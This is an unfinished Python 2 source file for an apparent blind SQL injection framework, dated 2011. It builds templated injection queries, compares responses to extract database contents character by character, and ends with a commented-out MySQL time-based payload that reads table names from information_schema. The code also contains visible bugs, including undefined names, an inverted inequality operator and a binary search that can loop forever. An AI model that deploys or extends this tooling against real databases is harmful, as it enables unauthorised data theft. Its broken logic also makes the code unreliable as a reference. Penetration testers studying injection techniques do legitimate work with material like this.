##NOT FINISHED##
##mastahyeti 2011##
from requests import async
from gevent.pool import Pool
from copy import copy
import gevent
import debug
from sys import stdout

CHARSET = [chr(x) for x in xrange(32,127)]
#CHARSET = [chr(x) for x in xrange(32,39)] + [chr(x) for x in xrange(40,127)] #everything but '
CHARSET_LEN = len(CHARSET)

#Supress output when possible
QUIET = False

#Debugging settings.
debug.DEBUG_FUNCTION_CALL = False
debug.DEBUG_FUNCTION_RETURN = False

#TODO:
#implement a diff function with some sort of regex. for non-time based blind that might have variations between identical requests. probably part of response
#Implement a _eq_size method for response
#Implement test functions for techniques (maybe. up for discussion. depends on if we want automated testing of many techniques)
#Implement some sort of interface. need to be able to list/search techniques by dbms/technique/blah. Also need to be able to launch attach.
#interface needs to include parser for raw http requests (simplifies firing an attack)


class NotImplemented(Exception):
    '''Throw this exception when a method that hasn't been implemented gets called'''
    def __init__(self, value):
        self.value = value
    def __repr__(self):
        return "This isn't implemented yet: " + self.value

class Query(object):
    '''
    A query is a string that can be rendered (think prinf). 
    query syntax is "SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}". 
    Anything inside ${} will be settable and will be rendered based on value set. For example: 
    
    >>> q = bbqsql.Query("hello ${x:world}")
    >>> print q.render()
    hello world
    >>> q.set_option('x','Ben')
    >>> print q.render()
    hello Ben
    '''
    @debug.func
    def __init__(self,q_string,options=None):
        '''
        q_string syntax is "SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}". 
        The options are specified in ${}, with the value before the ':' being the option name
        and the value after the ':' being the default value. 

        There is an optional options parameter that allows you to set the option values manually rather than
        having them be parsed.
        '''
        self.q_string = q_string
        if options:
            self.options = options
        else:
            self.options = self.parse_query(q_string)
    
    @debug.func
    def get_option(self,ident):
        '''
        Get the option value whose name is 'ident'
        '''
        return self.options[ident]
    
    @debug.func
    def set_option(self,ident,val):
        '''
        Set the value of the option whose name is 'ident' to val
        '''
        self.options[ident] = val

    @debug.func
    def get_options(self):
        '''
        Get all of the options (in a dict) for the query
        '''
        return self.options
    
    @debug.func
    def set_options(self,options):
        '''
        Set the queries option (dict).
        '''
        self.options = options
    
    @debug.func
    def parse_query(self,q):
        '''
        This is mostly an internal method, but I didn't want to make it private.
        This takes a query string and returns a options dict.
        '''
        options = {}
        section = q.split("${")
        if len(section) > 1:
            for section in section[1:]:
                inside = section.split("}")[0].split(":")
                ident = inside[0]
                if len(inside) > 1:
                    default = inside[1]
                else:
                    default = ""
                options[ident] = default
        return options
    
    @debug.func
    def render(self):
        '''
        This compiles the queries options and the original query string into a string.
        See the class documentation for an example.
        '''
        section = self.q_string.split("${")
        output = section[0]
        if len(section) > 1:
            for section in section[1:]:
                split = section.split('}')
                left = split[0]
                #in case there happens to be a rogue } in our query
                right = '}'.join(split[1:])
                ident = left.split(':')[0]
                val = self.options[ident]
                output += val
                output += right
        return output


class Technique(object):
    '''
    This is a sql injection teqnique. Eg. Union based or Time based... Techniques need
    to implement at minimum the run method which is what actually launches the technique.
    Techniques will usually also take a user_query (query we are trying to run on the db).
    The class init init will (almost?) always take a make_request_func as a param. This
    option specifies the function to call to make an actual request. 
    '''
    @debug.func
    def __init__(self,make_request_func,query,concurrency=1): 
        self.query = query
        self.make_request_func = make_request_func
        if type(self) == technique:
            raise NotImplemented

    def run(self):
        '''
        run the exploit
        '''
        raise NotImplemented("technique.run")


class BlindTechnique(Technique):
    @debug.func
    def run(self,user_query):
        
        user_query = user_query

        try:
            self.base_response
        except AttributeError:
            self._make_base_request()
    
        results = []
        row_index = 0
        row = True
        #we get more rows until the table is over
        while row:
            #if this isnt the first iteration
            if row != True:
                results.append(row)
            row = self._get_next_row(row_index,user_query)
            row_index += 1
        return results

    @debug.func
    def _get_next_row(self,row_index,user_query):
        '''finding a row'''
        row = ""
        char_index = 1
        char = True
        #we get more chars until the row is over
        while char:
            #if this isnt the first iteration
            if char != True:
                row += char
            char = self._get_next_char(char_index,row_index,user_query)
            char_index += 1
        if row != "":
            return row
        else:
            return False

    @debug.func
    def _get_next_char(self,char_index,row_index,user_query):
        '''finding a character'''
        low = 0
        high = CHARSET_LEN
        while low < high:
            mid = (low+high)//2
            update_char(CHARSET[mid])
            if self._is_greater(row_index, char_index, CHARSET[mid],user_query):
                high = mid
            else:
                low = mid
        mid = (low+high)//2
        if low < CHARSET_LEN and self._is_equal(row_index, char_index, CHARSET[mid],user_query):
            update_char()
            return CHARSET[mid]
        else:
            end_line()
            return False
    
    @debug.func
    def _is_greater(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','>')
        query_string = query.render()
        #if the response differs from the base_response, we return true
        return self.make_request_func(query_string) != self.base_response

    @debug.func
    def _is_equal(self,row_index,char_index,char_val,user_query):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''  
        query = copy(self.query)
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query.set_option('comparator','=')
        query_string = query.render()
        res = self.make_request_func(query_string)
        #if the response differs from the base_response, we return true
        return self.make_request_func(query_string) != self.base_response
    
    @debug.func
    def _make_base_request(self):
        '''
        Makes the base request to which all subsequent requests will be compared.
        The need for a base request is just a fact when dealing with blind sqli
        '''
        self.base_response = self.make_request_func()


class Requester(object):
    @debug.func
    def __init__( self , request , send_request_function ,  response_cmp_function = cmp ):
        self.request = request
        self.send_request_function = send_request_function
        self.response_cmp_function = response_cmp_function
    
    @debug.func
    def make_request(self,value=""):
        new_request = copy(self.request)
        #iterate over the __dict__ of the request and compile any elements that are 
        #query objects.
        for elt in [q for q in new_request.__dict__ if isinstance(new_request.__dict__[q],Query)]:
            opts = new_request.__dict__[elt].get_options()
            for opt in opts:
                opts[opt] = value
            new_request.__dict__[elt].set_options(opts)
            new_request.__dict__[elt] = new_request.__dict__[elt].render()
        
        #the function we are going to call
        function_to_call = self.send_request_function
        #if the function they sent us is a string, we will get that attr from the request and call it
        #with the args and kwargs passed to us.
        if type(self.send_request_function) == str:
            function_to_call = getattr(new_request,self.send_request_function)
            args = []
        #otherwise we will send new_request as the first argument to self.send_request_function
        else:
            args = [new_request]

        if not hasattr(func,"__call__"):
            raise Exception('the send_request_function you passed to Requester doesnt exist in the request object you passed')
        
        return Response( response = function_to_call(*args) , cmp_function = self.response_cmp_function )
        

class Response(object):
    '''
    This object is essentially a proxy for whatever type of response object you pass to it.
    The value is that you are able to assign a function for doing comparisons.
    '''
    @debug.func
    def __init__( self , response , cmp_function = cmp ):
        self.response = response
        self.cmp_function = cmp_function

    def __getattr__( self , attr ):
        return self.response.__getattr__( attr )
    
    def __setattr__( self , attr , value ):
        return self.response.__setattr__(attr,value)
    
    def __getitem__( self , key ):
        return self.response.__getitem__(key)
    
    def __setitem__( self , key , value ):
        return self.response.__setitem__(key,value)
    
    def __gt__( self , y ):
        return self.cmp_function(self,y) > 0
    
    def __lt__( self , y ):
        return self.cmp_function(self,y) < 0
    
    def __eq__( self , y ):
        return self.cmp_function(self,y) == 0
    
    def __ne__( self , y ):
        return self.cmp_function(self,y) == 0
    

@debug.func
def update_char(c=None):
    '''
    This just helps with fancy output. This deletes the last printed character from
    the terminal and replaces it with the specified character. This way, with blind sqli,
    we can have it appear to scroll through the characters it is testing and whatnot...
    Note that when using this you will need to manually delete the last character if you don't
    want it there and probably will need to use the end_line() function (bellow) for printing 
    a good looking new line.....
    '''
    if not QUIET:
        if c:
            stdout.write("\x08")
            stdout.write(c)
            stdout.flush()
        else:
            stdout.write(" ")
            stdout.flush()

@debug.func
def end_line():
    '''
    This is for fancy output. It deletes the last character printed to the terminal and
    starts a new line...
    '''
    if not QUIET:
        stdout.write("\x08 \n")
        stdout.flush()

if __name__ == "__main__":
    pass
    #mysql_query = Query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))${comparator}${char_val:123},sleep(${sleep:2}),0)=0")
